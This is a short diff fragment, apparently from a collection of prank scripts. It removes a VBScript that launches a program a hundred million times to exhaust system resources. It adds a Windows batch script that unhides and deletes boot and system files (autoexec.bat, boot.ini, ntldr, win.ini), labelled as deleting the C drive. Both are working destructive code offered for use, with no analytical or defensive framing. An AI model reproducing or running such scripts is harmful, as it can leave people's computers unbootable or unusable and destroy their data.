@@ -64,14 +64,14 @@ PAUSE
 
 -------------------------------------------------------
 
-Option Explicit
+@echo off
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
 
-Dim WSHShell
-Set WSHShell=Wscript.CreateObject("Wscript.Shell")
-
-Dim x
-For x = 1 to 100000000
-WSHShell.Run "Tourstart.exe"
-Next
-
-(save as .VBS)
+(deletes the c drive)
